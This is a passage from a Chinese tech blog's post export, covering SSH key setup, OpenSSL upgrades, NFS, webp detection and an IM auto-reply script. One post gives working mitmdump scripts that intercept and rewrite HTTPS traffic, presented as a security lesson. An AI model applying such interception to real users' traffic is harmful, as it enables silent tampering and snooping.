或点击右上角的用户名选择[账号安全]–[SSH 密钥管理]打开该页面； 4.点击创建 SSH 密钥，在弹出的对话框选择创建新密钥，密钥名称可以不填写，然后勾选提交后下载，最后点击提交； 5.然后可以看到该密钥文件以及被下载了，并且在该列表中已经存在一个密钥名称为 48e963e13b814ba5b42b5d2cad987d24 的密钥； 6.请打开 账号安全，或点击右上角的用户名-选择[账号安全]，在安全信息下的安全手机后点击立即绑定，绑定完成后开启短信验证； 7.点击产品与服务-找到云计算基础服务–找到 云服务器； 8.在云服务器列表中找到你的服务器点击[更多]–选择[更改 SSH 密钥]； 9.选择你刚才创建的密钥，点击确定，需要输入验证码进行验证，验证通过会返回云服务器列表； 10.复制你的公网 IP，我这里的 IP 是 59.111.57.31，然后参考连接 Linux 实例 文档来进行连接即可使用。以 mac 系统为例，赋予下载的密钥文件 600 权限，然后执行 ssh -i 密钥文件路径 root@ 公网 IP 即可连接； ➜ Downloads chmod 600 48e963e13b814ba5b42b5d2cad987d24 ➜ Downloads ssh -i 48e963e13b814ba5b42b5d2cad987d24 root@59.111.57.31 [root@default-nvm ~]# [root@default-nvm ~]# [root@default-nvm ~]#","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"mac 效率神器 Alfred","slug":"mac-效率神器-Alfred","date":"2018-09-19T11:26:21.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/1019.html","link":"","permalink":"https://awen.me/posts/1019.html","excerpt":"mac 下自带的Spotlight只能进行本地文件的搜索，速度超级慢，今天给大家推荐个提高工作效率的神器-Alfred。","text":"mac 下自带的Spotlight只能进行本地文件的搜索，速度超级慢，今天给大家推荐个提高工作效率的神器-Alfred。 Alfred 是一个功能超级强大的工具，他除了能够搜索本地文件、应用还能经过定制后搜索互联网上的内容，除此之外，workflow 为用户提供了可定制化的服务，用户可以自行编写插件来实现查询。 能干啥说了这么多，让我们从一个常用的场景来感受下它的效率： 从前，我们要去谷歌搜索一个东西，我们需要： 1.打开浏览器2.输入网址3.在谷歌的搜索栏中输入内容，然后点击搜索 嗯，我们需要至少3步。那么有了 alfred，只需要，快捷键启动 alfred，然后输入你需要搜索的内容，回车就 ok 了。比如要搜索 Java 编程思想，我们 command + 空格调出 alfred 直接输入关键词，他默认可以去谷歌、亚马逊 维基百科搜索，当然你可以自行定制更多的搜索引擎。 然后回车，直接打开浏览器给出搜索结果 上面这个是浏览器搜索，那么比如在举一个例子，程序员经常要给变量、常量起名字，这个名字真的是太难想了，我们常见的命名方式有驼峰、下划线，用 workflow 自己写个插件直接输入汉字，就能给出变量名： 当然，这个得借助 workflow 来实现了 在举个例子，我要查询个域名是否备案，直接输入 域名即可查询 查询 ip 地址归属 搜索 github 上的项目 搜索浏览器的书签 计算器 哇，说了这么多，是不是感觉很多事情在一个框内就能完成 怎么编写 workflow其实有很多现成的 workflow 文件，可以去网上搜，但是有时候我们自己的需求可能 一些插件不能满足我们的需求，那么我们可以自己动手写，怎么写呢？ 1.首先，我们打开 alfred 的 Preferences –切换到 workflows 点击+号，新建一个空的 workflow 输入名称 描述等，比如我们要实现一个备案信息查询的功能 新建完成之后，如图所示 在右侧这个黑色的工作区，我们点击右键 新建一个脚本，选择 input –script Filter 如图所示 其中 keywrod 是我们要在搜索框中查询的前缀，比如我们要查询 awen.me 这个域名,我们就需要输入icp 然后在输入 awen.me 查询 我们使用 python 去编写这个备案查询的工具， 语言选 bash，然后选择 with input as {query} ，如图所示设置完之后，点击右下角的按钮，打开这个项目的目录，我们需要添加几个文件和目录，其中 info.plist 是自带的，其他都需要单独添加 编写 workflow 插件这个目录的路径 在 cd ~/Library/Application Support/Alfred 3/Alfred.alfredpreferences/workflows/user.workflow.CF54DF51-50FA-44F8-BBD0-B818F30FDF8B我们进入到这个目录，执行 pip install --target=. Alfred-Workflow\\n就得到workflow 这个目录了，这个目录下都是workflow 的 python 库，目前只能使用 python2.x 编写插件。当然其他语言也是支持的。比如 shell php ruby 等。 beian.py 这个文件就是我们上面定义的脚本，其内容如下 # -*-coding:utf-8-*- # Auth: awen # E-mail:hi@awen.me from workflow import Workflow, ICON_WEB, web import sys def main(wf): param = (wf.args[0] if len(wf.args) else &apos;&apos;).strip() domain = param url = &quot;https://sapi.k780.com?app=domain.beian&amp;domain=&quot;+domain+&quot;&amp;appkey=xxxx&amp;sign=xxxxxxx&amp;format=json&quot; r = web.get(url) r.raise_for_status() r = r.json() try: if r[&apos;result&apos;][&apos;icpno&apos;]: icpno = r[&apos;result&apos;][&apos;icpno&apos;] wf.add_item(title=domain, subtitle=icpno) wf.send_feedback() else: wf.add_item(title=domain, subtitle=u&quot;没有查询到备案信息&quot;) wf.send_feedback() except: wf.add_item(title=domain, subtitle=u&quot;没有查询到备案信息&quot;) wf.send_feedback() if __name__ == &apos;__main__&apos;: wf = Workflow() sys.exit(wf.run(main))这样一个插件就编写好了。这些语法请参考 http://www.deanishe.net/alfred-workflow/","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://awen.me/tags/mac/"}]},{"title":"Python3 ssh 远程 Linux","slug":"Python3-ssh-远程-Linux","date":"2018-09-14T08:03:29.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/25659.html","link":"","permalink":"https://awen.me/posts/25659.html","excerpt":"使用 python 3 去连接一台 Linux 主机,需要先安装 paramiko pip3 install paramiko","text":"使用 python 3 去连接一台 Linux 主机,需要先安装 paramiko pip3 install paramiko 连接 import paramiko def loginMachine(sshHostName, sshUserName, sshPort, sshIdentityFile): # 加载密钥 sshPrivateKey = paramiko.RSAKey.from_private_key_file(IdentityFile) # 建立连接 client = paramiko.SSHClient() # 使用密钥自动登录 client.set_missing_host_key_policy(paramiko.AutoAddPolicy) client.connect(hostname=sshHostName, username=sshUserName, port=sshPort, pkey=sshPrivateKey) return client def executeCommand(sshClient, sshCommand): # 执行命令 stdin, stdout, stderr = sshClient.exec_command(sshCommand) directory = str(stdout.read().decode()).split() print(directory) if __name__ == &apos;__main__&apos;: HostName = &quot;11.1.1.8&quot; Port = &quot;22&quot; UserName = &quot;root&quot; IdentityFile = &quot;/Users/wenjun/.ssh/xiaoshan&quot; sshClient = loginMachine(HostName, UserName, Port, IdentityFile) sshCommand = &quot;cd /opt/ &amp;&amp; ls&quot; executeCommand(sshClient,sshCommand)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"CentoOS 7 升级 Openssl","slug":"CentoOS-7-升级-Openssl","date":"2018-09-13T22:19:38.000Z","updated":"2021-02-26T06:05:29.241Z","comments":true,"path":"posts/12505.html","link":"","permalink":"https://awen.me/posts/12505.html","excerpt":"OpenSSL 1.1.1 已发布，这是新的长期支持版本（LTS），开发团队承诺至少提供五年支持。 自 1.1.0 发布以来，已有超过 200 位个人贡献者提交了近 5000 个 commits。OpenSSL 1.1.1 最重要的变化就是添加对 TLS v1.3 (RFC8446) 的支持。","text":"OpenSSL 1.1.1 已发布，这是新的长期支持版本（LTS），开发团队承诺至少提供五年支持。 自 1.1.0 发布以来，已有超过 200 位个人贡献者提交了近 5000 个 commits。OpenSSL 1.1.1 最重要的变化就是添加对 TLS v1.3 (RFC8446) 的支持。 TLS v1.3 的优势包括： 由于减少了客户端和服务器之间所需的往返次数，缩短了连接时间。 在某些情况下，客户端能够立即开始将加密数据发送到服务器而无需与服务器进行任何往返（称为 0-RTT 或“early data”）。 由于删除了各种过时和不安全的加密算法及握手加密，提高了安全性。 OpenSSL 1.1.1 其他亮点包括： 完全重写 OpenSSL 随机数生成器以引入以下功能： The default RAND method now utilizes an AES-CTR DRBG according to NIST standard SP 800-90Ar1. Support for multiple DRBG instances with seed chaining. There is a public and private DRBG instance. The DRBG instances are fork-safe. Keep all global DRBG instances on the secure heap if it is enabled. The public and private DRBG instance are per thread for lock free operation 支持各种新的加密算法，包括： SHA3 SHA512/224 and SHA512/256 EdDSA (including Ed25519 and Ed448) X448 (adding to the existing X25519 support in 1.1.0) Multi-prime RSA SM2 SM3 SM4 SipHash ARIA (including TLS support) 旁路攻击安全性改进 Maximum Fragment Length TLS 扩展支持 新增 STORE 模块，它实现了一个规格一致的基于 URI 的存储读取器，可包含密钥、证书、CRL 和许多其他对象。 操作步骤下载 openssl 最新的长期支持版本 1.1.1.1wget -c https://www.openssl.org/source/openssl-1.1.1.tar.gz解压后进入目录执行 ./config -fPIC --prefix=/usr/local/openssl enable-shared ./config -t make &amp;&amp; make install ln -s /usr/local/openssl/bin/openssl /usr/bin/openssl ln -s /usr/local/ssl/include/openssl /usr/include/openssl 然后执行 echo “/usr/local/ssl/lib” &gt;&gt; /etc/ld.so.conf ldconfig -v查看版本 [root@iz28wru16cpz ~]# openssl version OpenSSL 1.1.1 11 Sep 2018nginx 升级pushd openssl-1.1.1 wget https://raw.githubusercontent.com/hakasenyang/openssl-patch/master/openssl-equal-1.1.1.patch patch -p1 &lt; openssl-equal-1.1.1.patch popd pushd nginx-1.15.3 wget https://raw.githubusercontent.com/kn007/patch/d6afe6aa688d6ee0691bea8303e5c8e93a3239b5/nginx.patch wget https://raw.githubusercontent.com/kn007/patch/c59592bc1269ba666b3bb471243c5212b50fd608/nginx_auto_using_PRIORITIZE_CHACHA.patch patch -p1 &lt; nginx.patch patch -p1 &lt; nginx_auto_using_PRIORITIZE_CHACHA.patch popd ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/nginx/pcre-8.41 --with-http_v2_module --with-http_ssl_module --with-zlib=/opt/nginx/zlib-1.2.11 --with-openssl=/root/openssl-1.1.1 --add-module=/opt/nginx/ngx_brotli --with-http_v2_hpack_enc","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"nfs 指定大于1024的源端口挂载","slug":"nfs-指定源端口挂载","date":"2018-09-13T02:33:41.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/48332.html","link":"","permalink":"https://awen.me/posts/48332.html","excerpt":"mount 加-o noresvport 参数 [root@vpn /]# mount -t nfs4 -o noresvport nase482c5fb3b.nas.cn-east-1.internal:/ /mnt/ -v mount.nfs4: timeout set for Thu Sep 13 10:34:31 2018 mount.nfs4: trying text-based options &apos;noresvport,vers=4.1,addr=192.168.10.69,clientaddr=192.168.10.163&apos; mount.nfs4: mount(2): Protocol not supported mount.nfs4: trying text-based options &apos;noresvport,vers=4.0,addr=192.168.10.69,clientaddr=192.168.10.163&apos;","text":"mount 加-o noresvport 参数 [root@vpn /]# mount -t nfs4 -o noresvport nase482c5fb3b.nas.cn-east-1.internal:/ /mnt/ -v mount.nfs4: timeout set for Thu Sep 13 10:34:31 2018 mount.nfs4: trying text-based options &apos;noresvport,vers=4.1,addr=192.168.10.69,clientaddr=192.168.10.163&apos; mount.nfs4: mount(2): Protocol not supported mount.nfs4: trying text-based options &apos;noresvport,vers=4.0,addr=192.168.10.69,clientaddr=192.168.10.163&apos; TCP 抓包 [root@vpn fwj]# tcpdump -i eth0 host 192.168.10.69 and tcp -nn tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 10:32:31.269689 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [S], seq 3488328641, win 29200, options [mss 1460,sackOK,TS val 259784458 ecr 0,nop,wscale 8], length 0 10:32:31.271531 IP 192.168.10.69.2049 &gt; 192.168.10.163.45636: Flags [S.], seq 1298561814, ack 3488328642, win 14480, options [mss 1460,sackOK,TS val 3735081649 ecr 259784458,nop,wscale 9], length 0 10:32:31.271550 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [.], ack 1, win 115, options [nop,nop,TS val 259784460 ecr 3735081649], length 0 10:32:31.271656 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [P.], seq 1:45, ack 1, win 115, options [nop,nop,TS val 259784460 ecr 3735081649], length 44: NFS request xid 3033161417 40 null 10:32:31.272221 IP 192.168.10.69.2049 &gt; 192.168.10.163.45636: Flags [.], ack 45, win 29, options [nop,nop,TS val 3735081649 ecr 259784460], length 0 10:32:31.272316 IP 192.168.10.69.2049 &gt; 192.168.10.163.45636: Flags [P.], seq 1:29, ack 45, win 29, options [nop,nop,TS val 3735081649 ecr 259784460], length 28: NFS reply xid 3033161417 reply ok 24 null 10:32:31.272325 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [.], ack 29, win 115, options [nop,nop,TS val 259784461 ecr 3735081649], length 0 10:32:31.272501 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [P.], seq 45:301, ack 29, win 115, options [nop,nop,TS val 259784461 ecr 3735081649], length 256: NFS request xid 3049938633 252 getattr fh 0,1/42 10:32:31.272814 IP 192.168.10.69.2049 &gt; 192.168.10.163.45636: Flags [P.], seq 29:69, ack 301, win 31, options [nop,nop,TS val 3735081650 ecr 259784461], length 40: NFS reply xid 3049938633 reply ok 36 getattr ERROR: unk 10021 10:32:31.273189 IP 192.168.10.163.45636 &gt; 192.168.10.69.2049: Flags [F.], seq 301, ack 69, win 115, options [nop,nop,TS val 259784462 ecr 3735081650], length 0 10:32:31.273431 IP 192.168.10.163.45638 &gt; 192.168.10.69.2049: Flags [S], seq 3379214698, win 29200, options [mss 1460,sackOK,TS val 259784462 ecr 0,nop,wscale 8], length 0","categories":[],"tags":[]},{"title":"如何判断图片的格式","slug":"如何判断图片的格式","date":"2018-09-03T02:52:07.000Z","updated":"2021-02-26T06:05:29.325Z","comments":true,"path":"posts/46321.html","link":"","permalink":"https://awen.me/posts/46321.html","excerpt":"如何判断图片的格式问题客户上传的一张图片，chrome 和大部分的 Android 设备访问都正常，而苹果的设备访问则打不开，这是为什么？","text":"如何判断图片的格式问题客户上传的一张图片，chrome 和大部分的 Android 设备访问都正常，而苹果的设备访问则打不开，这是为什么？ chrome 访问 safari 访问 这是为什么呢？当遇到这类问题，我们应该怎么去排查？ 首先，当我们看到这类问题，第一眼就该有个意识，图片格式有问题。因为 Android 操作系统是谷歌的，chrome 也是谷歌的，国产的一些 chromium 内核的浏览器其本质也和谷歌浏览器一样，比如360、QQ 浏览器、搜狗浏览器都是 chrome 开源版浏览器的内核。 那么我们平常接触到的图片格式有，jpg、gif、png。这些格式正常来说在不同内核的浏览器上都是可以正常识别的，而只有一种格式是只能在 chrome 浏览器上正常访问，其他浏览器不支持。 什么是 webpwebp 是谷歌开源的图片编码格式，它的最大特点就是算法牛逼，能够将图片的体积缩小但是质量不减。具体参考 google 官网说明https://developers.google.com/speed/webp/ 怎么判断图片是 webp 呢1.首先，第一种方式是查看图片的 response 头信息中的 content-type 字段,如果字段中带有 image/webp 就表示该图片是 webp 的格式，你可以试试把这个图片的 url 放到 Safari 访问试试。 2.我们查看上述案例的图片格式，发现其类型是 image/jpeg 格式，那能证明这张图片就不是 webp 了吗？ 我们通过 ffplay 去查看下，发现其输入的格式是 webp。 ffplay http://cdn.zhi6.live/upload/20180830/968d5e9e866c6951d5c67b05e6e3f393.jpg ffplay version 4.0.2 Copyright (c) 2003-2018 the FFmpeg developers built with Apple LLVM version 9.1.0 (clang-902.0.39.2) configuration: --prefix=/usr/local/Cellar/ffmpeg/4.0.2 --enable-shared --enable-pthreads --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-gpl --enable-ffplay --enable-libmp3lame --enable-libx264 --enable-libxvid --enable-opencl --enable-videotoolbox --disable-lzma libavutil 56. 14.100 / 56. 14.100 libavcodec 58. 18.100 / 58. 18.100 libavformat 58. 12.100 / 58. 12.100 libavdevice 58. 3.100 / 58. 3.100 libavfilter 7. 16.100 / 7. 16.100 libavresample 4. 0. 0 / 4. 0. 0 libswscale 5. 1.100 / 5. 1.100 libswresample 3. 1.100 / 3. 1.100 libpostproc 55. 1.100 / 55. 1.100 Input #0, webp_pipe, from &apos;http://cdn.zhi6.live/upload/20180830/968d5e9e866c6951d5c67b05e6e3f393.jpg&apos;: Duration: N/A, bitrate: N/A Stream #0:0: Video: webp, yuv420p(tv, bt470bg/unknown/unknown), 1008x2016, 25 tbr, 25 tbn, 25 tbc另外如果不打算安装 ffplay 可以找一些在线图片格式检测的网站去检测下","categories":[],"tags":[{"name":"webp","slug":"webp","permalink":"https://awen.me/tags/webp/"}]},{"title":"不是浏览器有了 HTTPS,浏览器显示绿色的小锁就是安全的","slug":"mitmdump 的使用","date":"2018-08-30T12:31:26.000Z","updated":"2021-02-26T06:05:29.278Z","comments":true,"path":"posts/46695.html","link":"","permalink":"https://awen.me/posts/46695.html","excerpt":"本文主要讲解如何使用 mitmdump 配合 python 来实现抓包,修改请求头和响应内容，目的是希望各位千万别只看网站是不是加了 https 就安全了，并不是使用了 HTTPS，浏览器显示个绿色的小锁就代表网站是安全的，当黑客通过 MITM 中间人攻击，只要有权限，是可以随意篡改请求和响应头或响应内容的。","text":"本文主要讲解如何使用 mitmdump 配合 python 来实现抓包,修改请求头和响应内容，目的是希望各位千万别只看网站是不是加了 https 就安全了，并不是使用了 HTTPS，浏览器显示个绿色的小锁就代表网站是安全的，当黑客通过 MITM 中间人攻击，只要有权限，是可以随意篡改请求和响应头或响应内容的。 增加请求头def response(flow): flow.response.headers[&quot;newheader&quot;] = &quot;foo&quot; 改写请求参数实现，改写百度的搜索关键词，不管输入任何关键词都替换成网易云 from mitmproxy import ctx def request(flow): # 忽略非百度搜索地址 if flow.request.host != &quot;www.baidu.com&quot; or not flow.request.path.startswith(&quot;/s&quot;): return # 确认请求参数中有搜索词 if &quot;wd&quot; not in flow.request.query.keys(): return # 替换搜索词为“网易云” flow.request.query.set_all(&quot;wd&quot;, [&quot;网易云&quot;]) flow.request.host http请求host效果 关于 flow request 的一些方法 flow.request.method 请求方法 flow.request.scheme 请求协议 flow.request.url 请求URL链接 flow.request.query 请求URL查询参数 flow.request.path 请求URL路径 flow.request.urlencoded_form 请求POST数据 flow.response.status_code HTTP响应状态码 flow.response.headers HTTP响应头信息 flow.response.get_text HTTP响应内容 改写响应信息def response(flow): # 忽略非百度搜索地址 if flow.request.host != &quot;www.baidu.com&quot;: return # 将响应中百度的 logo“”替换为“谷歌的 logo” text = flow.response.get_text() text = text.replace(&quot;//www.baidu.com/img/bd_logo1.png&quot;, &quot;https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_120x44dp.png&quot;) flow.response.set_text(text)效果 爬取得到 APP 电子书存入 MongoDB(来源 python 爬虫)import json import pymongo from mitmproxy import ctx client = pymongo.MongoClient(&apos;localhost&apos;) db = client[&apos;igetget&apos;] collection = db[&apos;books&apos;] def response(flow): global collection url = &apos;https://dedao.igetget.com/v3/discover/bookList&apos; if flow.request.url.startswith(url): text = flow.response.text data = json.loads(text) books = data.get(&apos;c&apos;).get(&apos;list&apos;) for book in books: data = { &apos;title&apos;: book.get(&apos;operating_title&apos;), &apos;cover&apos;: book.get(&apos;cover&apos;), &apos;summary&apos;: book.get(&apos;other_share_summary&apos;), &apos;price&apos;: book.get(&apos;price&apos;) } ctx.log.info(str(data)) collection.insert(data)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python3 实现自动化 IM 回复用户","slug":"python3-实现自动化-IM-回复用户","date":"2018-08-29T11:59:04.000Z","updated":"2021-02-26T06:05:29.287Z","comments":true,"path":"posts/42967.html","link":"","permalink":"https://awen.me/posts/42967.html","excerpt":"公司使用逸创的工单系统，平时也有企业用户通过在线 IM 接入，老大给我们组定了个KPI，5分钟内响应企业用户问题，包括在线 IM 和工单，工单之前写过一个自动化脚本（现在回过头看我几个月前写的代码真的是垃圾，抽空重构下），工单嘛，蛮简单的，反正逸创有接口，直接调用就行，但是 IM 我发现他们对外没提供接口，这个就尴尬了。 我的需求是 在用户接入 IM 后 能够先1分钟内响应他一下，避免 KPI 超时，如果问的是一些常见式的固定问题就正确匹配下用户的回复然后去回复。","text":"公司使用逸创的工单系统，平时也有企业用户通过在线 IM 接入，老大给我们组定了个KPI，5分钟内响应企业用户问题，包括在线 IM 和工单，工单之前写过一个自动化脚本（现在回过头看我几个月前写的代码真的是垃圾，抽空重构下），工单嘛，蛮简单的，反正逸创有接口，直接调用就行，但是 IM 我发现他们对外没提供接口，这个就尴尬了。 我的需求是 在用户接入 IM 后 能够先1分钟内响应他一下，避免 KPI 超时，如果问的是一些常见式的固定问题就正确匹配下用户的回复然后去回复。 直到某一天，我好奇的抓个 HTTP 请求看看他们在线 IM 到底是怎么请求和响应数据的，顺便把他的请求 URL 和 Request 头直接复制到 postman 去跑一下，咦，居然能够发送消息。但是我怕里面带个 cookie 啥的，那我还得模拟登陆才行，仔细观察下发现里面根本就没有什么过期的值，全部都是固定的内容，包含当前账号的 ID 企业信息， token，这个 token 也是不会过期的。 既然如此，这个就好办了，直接构造一个请求去发送信息即可。 最近跟核心开发的老工程师学了点写代码的套路，啥套路呢，就是代码要写的整洁点。尽量不要写的非常难读，避免多层嵌套。 然后想到这里，我就想着这次写这个 IM 的代码一定不要跟上次一样了，怎么写呢。因为我根据用户的回复去判断怎么回复一些基础性问题，所以我之前的代码里面夹杂了太多的汉字，非常难看，这次我直接定义一个 json 文件，然后把正则和要回复的内容写进去，类似这样 { &quot;reply&quot;:[ { &quot;id&quot;:1, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;im&quot;, &quot;rule&quot;:&quot;.{0,}((云通信|短信(签名|模板|审核|服务|平台|群发|包))|.{0,}验证码接入)&quot;, &quot;msg&quot;:&quot;您好，目前在线客服系统仅受理网易云基础服务咨询，网易云信相关咨询请您联系您的云信客户经理或者云信客服电话4009-000-123。也可以点击&lt;a href=&apos;https://app.netease.im/index#/issue/submit&apos;&gt;云信工单系统&lt;/a&gt; 跳转提交工单咨询。或登录控制台-找到产品与服务--通信与视频-点击进入，在左侧导航栏点击工单，提交您的问题。感谢您对网易云基础服务的支持！&quot; }, { &quot;id&quot;:2, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;im&quot;, &quot;rule&quot;:&quot;.{0,}(发票|开票)&quot;, &quot;msg&quot;:&quot;您好，根据您的问题，猜您可能想了解：&lt;br&gt; &lt;strong&gt;1.发票提交后多久寄出&lt;/strong&gt;&lt;br&gt;答:发票一般从您提交到开出需要5-7个工作日。&lt;br&gt;&lt;strong&gt;2.为什么我刚充的钱发票管理里面不显示？&lt;/strong&gt;&lt;br&gt;答: 发票的金额需要是已经消费的金额才可以申请，并且本月的（预付费和后付费）消费要到次月2号才可以申请发票。&lt;br&gt;&lt;strong&gt;3.开发票有最低金额限制吗？寄送发票免快递费吗？&lt;/strong&gt;&lt;br&gt;答: 开具发票目前暂无金额限制，寄送发票我们都是免费的。&lt;br&gt;&lt;strong&gt;4.在哪里开发票？&lt;/strong&gt;&lt;br&gt;答：您可以在控制台找到业务支持-业务消费-发票管理，点击申请发票，或直接点击跳转到&lt;a href=&apos;https://c.163yun.com/dashboard#/m/account/expense/invoice/&apos; target=&apos;_blank&apos;&gt;发票管理&lt;/a&gt; 页面。&lt;br&gt;&lt;strong&gt;5.怎么开具增值税专用发票?&lt;/strong&gt;&lt;br&gt;答:通过企业认证和专票信息审核的用户可以开具增值税专用发票；&lt;br&gt;&lt;strong&gt;6. 为什么我不能开具发票？&lt;/strong&gt;&lt;br&gt;答:可能出现的情况：1.账户欠费情况下不能申请发票。2.本月消费需要次月初才能开具发票。3.您未使用网易云基础服务的产品，例如使用的是云信的服务，则需联系云信申请发票。&lt;br&gt;&lt;strong&gt;7.开具发票需求注意什么？&lt;/strong&gt;&lt;br&gt;答:应国家税务总局要求，自2017年7月1日起，若开具增值税普通发票，企业类型必须具备税号，否则发票将无法用于企业报销。&quot; }, { &quot;id&quot;:3, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;im&quot;, &quot;rule&quot;:&quot;.{0,}(修改|更改)安全手机&quot;, &quot;msg&quot;:&quot;您好，因安全手机是用于云计算基础服务进行资源关键操作的安全验证的，如无法自助修改安全手机，请根据如下情况提交对应的资料。审核通过后可以协助您修改，我们会在 1-2 个工作日之内给您处理： &lt;br&gt;&lt;strong&gt;对于个人用户，请提交以下资料：&lt;/strong&gt;&lt;br&gt; 1.请工单提交注册时的身份证反面照片(有国徽的那面)以及手持身份证正面(含个人照片的那面)，并提供原安全手机号和需要修改的安全手机号&lt;br&gt; &lt;strong&gt;对于企业用户，需要您完善并打印以下模板内容，并加盖公司章拍照上传给我们:&lt;/strong&gt; &lt;br&gt; 公司名称：xxx公司 &lt;br&gt; 问题描述：因 xxx 原因无法自助修改安全手机，需要网易云协助修改安全手机。&lt;br&gt; 修改内容：&lt;br&gt; 原安全手机：xxx 修改为：xxx&quot; }, { &quot;id&quot;: 4, &quot;status&quot;: &quot;new&quot;, &quot;rule&quot;: &quot;^没(了|问题了|有问题了)&quot;, &quot;msg&quot;: &quot;好的，那这边如果没有问题我稍后就关闭会话了哈，如您还有问题可以再次联系我们。感谢您对网易云的大力支持，祝您生活愉快！&quot; } ] }然后读取这个文件去判断，这样代码就看着整洁多了，此外对于多重嵌套循环，直接判断后 return 掉，避免形成多重嵌套，导致易读性差。 我们看下逸创的发消息接口，里面包含了消息类型，消息和chat_id，另外还有发送消息的时间，这个时间是个 unix 时间戳精确到毫秒，然后请求头里面xxxx 的内容敏感，我这里隐去了。 def send_chat(msg_info, chat_id): url = &quot;https://im2-agent.kf5.com/messages&quot; unix_time = str(int(round(time.time() * 1000))) payload = { &quot;message&quot;: {&quot;msg&quot;: msg_info, &quot;type&quot;: &quot;chat.msg&quot;, &quot;chat_id&quot;: chat_id, &quot;token&quot;: None, &quot;custom_id&quot;: unix_time, &quot;recalled&quot;: False}} headers = { &apos;Accept&apos;: &quot;application/json, text/javascript, */*; q=0.01&quot;, &apos;Accept-Encoding&apos;: &quot;gzip, deflate, br&quot;, &apos;Accept-Language&apos;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &apos;Connection&apos;: &quot;keep-alive&quot;, &apos;Content-Type&apos;: &quot;application/json; charset=UTF-8&quot;, &apos;DNT&apos;: &quot;1&quot;, &apos;Host&apos;: &quot;im2-agent.kf5.com&quot;, &apos;Origin&apos;: &quot;https://xxxxx.kf5.com&quot;, &apos;Referer&apos;: &quot;https://xxxxx.kf5.com/agent/&quot;, &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&quot;, &apos;X-Agent-ID&apos;: &quot;xxxxx&quot;, &apos;X-Company-ID&apos;: &quot;xxxx&quot;, &apos;X-Token&apos;: &quot;xxxxxxx&quot;, &apos;Cache-Control&apos;: &quot;no-cache&quot;, } response = requests.request(&quot;POST&quot;, url, data=json.dumps(payload), headers=headers) if response.status_code != 200: return if response.json()[&apos;message&apos;] is not None: return True然后读取 json 文件并进行判断 def read_imjson_config(): with open(&apos;im.json&apos;, &apos;r&apos;) as f: data = json.load(f) status = [(d[&apos;status&apos;]) for d in data[&apos;reply&apos;]] rule = [(d[&apos;rule&apos;]) for d in data[&apos;reply&apos;]] msg = [(d[&apos;msg&apos;]) for d in data[&apos;reply&apos;]] return [status,rule,msg] def check_rule(msg_info,chat_id): read_json = read_imjson_config() status = read_json[0] rule_str = read_json[1] msg_str = read_json[2] for k,v in enumerate(status): rule = rule_str[k] msg = msg_str[k] if re.search(rule,msg_info): send_chat(msg,chat_id)嗯，反正就是这个样子玩嘛，至少在我上厕所或者忙其他时间没看见工单的时候，这个工单响应时间不会超时，另外，用户接入后，我可以直接去做一些预先的准备工作，比如去查询用户的信息，了解下用户的基本情况后更快速的处理用户问题。老实讲，技术支持这个工作本质上就是个高级点的客服，只不过比客服懂点技术。如果不让自己的工作有点价值有点意义，其实和普通客服也没啥本质区别。大多数情况下都是重复相同的内容。其实也不止技术支持啦，很多岗位其实都是一个萝卜一个坑。干的工作也大多数都没技术含量。都是日复一日的挖坑、填坑。 你以为开发就很高大上吗？其实大部分开发也是挖坑、填坑。只不过待遇确实要比我们好很多。但是人家那待遇2万，时薪也蛮低的吧，天天加班赶项目。况且也并不是所有开发都是2万以上月薪。 未来，像这种岗位估计 99% 都得被机器替代掉，或者只需要很少的人去完成这项工作。如果只是满足于当前这种手动处理问题效率低且质量差，来个用户手动回复工单，你的打字速度再快你有机器快啊。况且人工处理还容易打错字，而机器只要代码逻辑正确，基本不会回复错误的。一步一步按照指令去处理。 我已经意识到这一点了，所以我得想办法提升自己的价值，那就得学好编程啊！之前想找运维岗位也做过运维，不过我发现大部分运维其实也不比技术支持好到哪里去，干的体力活还要加班熬夜。 昨天拒掉阿里内推的一个 CDN 技术支持工作，待遇15k 以上的，因为他写的薪资是15-30k。级别是 P6 ，问我能不能加班熬夜，说有时候得干到24点以后。我想着还是算了吧，加班熬夜的活我也干过，况且还是 CDN 这个干过的工作，没啥挑战性，肯定又是重复以前差不多的工作内容，而且阿里这个加班太严重了。嗯，最关键是要熬夜。挣这点钱，还不够以后去医院的。身为一个底层人民，我想想还是不做这个吃亏的生意。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python3 爬虫实现抓取工信部备案信息","slug":"python3-爬虫实现抓取工信部备案信息","date":"2018-08-29T08:40:19.000Z","updated":"2021-02-26T06:05:29.288Z","comments":true,"path":"posts/23162.html","link":"","permalink":"https://awen.me/posts/23162.html","excerpt":"大家好，我是阿文，今天给大家讲解一下如何使用 python 来查询工信部域名备案信息，那么先讲下为什么不直接查询而是要用这种手段爬呢？ 首先，工信部这个网站也不知道是不是找外包做的，里面各种嵌套表格（现在网站基本都是 div+css 